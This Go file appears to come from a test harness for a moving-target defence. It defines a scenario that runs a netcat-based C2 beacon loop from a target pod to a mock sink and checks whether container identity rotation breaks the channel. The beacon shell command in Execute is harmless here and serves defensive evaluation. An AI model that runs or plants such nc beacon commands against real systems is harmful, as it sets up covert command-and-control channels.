package scenarios

import (
	"context"
	"fmt"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/core"
	"github.com/r6security/phoenix-test-harness/internal/mocks"
)

func init() { core.RegisterScenario(&c2C2Disrupt{}) }

// HeartbeatTarget is K: the number of beacon heartbeats the attacker must deliver
// on ONE stable identity to "win".
const HeartbeatTarget = 5

// c2C2Disrupt: a persistent beacon to the mock C2 sink. ORACLE (attacker): K
// heartbeats delivered on ONE stable identity. Disrupted iff the established
// session is severed by a rotation before completing K heartbeats. R6 partial:
// identity rotation drops a long-lived channel each cycle but cannot target an
// active channel on demand; a beacon re-establishes after rotation.
type c2C2Disrupt struct {
	app  string
	sink *mocks.MockC2Sink
}

func (s *c2C2Disrupt) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c2-c2-disrupt",
		Category:           core.CategoryR6Claimed,
		Source:             "Cat2; Phoenix-adaptive-containers III 'Disrupts C2'; AMTD-AI-infra C2-dropped",
		R6ResponseTag:      core.R6Partial,
		AttackTechniqueIDs: []string{"T1071", "T1573", "T1008", "T1105"},
		R6Justification:    "Identity rotation drops a long-lived C2 channel at each cycle (true) but cannot target an active channel on demand (no C2 emitter). A beacon re-establishes after rotation; only sustained/long transfers are reliably disrupted. Honest partial.",
	}
}

func (s *c2C2Disrupt) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c2c2-target"
	sink, err := mocks.DeployC2Sink(ctx, env)
	if err != nil {
		return err
	}
	s.sink = sink
	_, err = deployTarget(ctx, env, s.app, "", nil)
	return err
}

func (s *c2C2Disrupt) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	stages := []string{
		"c2: establish a beacon to the mock sink (T1071/T1573)",
		"beacon: send K heartbeats on one identity (rotation may sever)",
	}
	// Send K heartbeats spaced ~1s so a rotation can sever the channel mid-beacon.
	beaconCmd := fmt.Sprintf(
		"i=0; while [ $i -lt %d ]; do echo HEARTBEAT$i | nc -w 1 %s 8090; i=$((i+1)); sleep 1; done; echo beacon-done",
		HeartbeatTarget, s.sink.ClusterDNS)
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", beaconCmd})
	env.Log.Logf("c2-c2-disrupt: beacon exit=%d (out=%q)", res.ExitCode, res.Stdout)
	return core.AttackResult{Stages: stages, Commands: []string{"sh -c '" + beaconCmd + "'"}}, nil
}

func (s *c2C2Disrupt) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	time.Sleep(2 * time.Second)
	// Each heartbeat is ~ "HEARTBEATn\n" ~ 11 bytes. K heartbeats => >= K*10 bytes.
	got, err := s.sink.BytesReceived(ctx, env)
	ev := map[string]string{"sinkBytes": fmt.Sprintf("%d", got)}
	if err != nil {
		ev["sinkError"] = err.Error()
	}
	// Did the beacon source survive (stable identity) AND deliver K heartbeats?
	_, srcErr := runningPodByApp(ctx, env, s.app)
	stableIdentity := srcErr == nil
	deliveredK := got >= int64(HeartbeatTarget*9)
	ev["stableIdentity"] = fmt.Sprintf("%v", stableIdentity)
	ev["deliveredK"] = fmt.Sprintf("%v", deliveredK)
	achieved := deliveredK
	state := fmt.Sprintf("beacon delivered ~%d bytes (>=K=%v), source identity stable=%v", got, deliveredK, stableIdentity)
	return core.OracleResult{Achieved: achieved, ObservedState: state, Evidence: ev}, nil
}

func (s *c2C2Disrupt) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, s.app, "mock-c2")
}
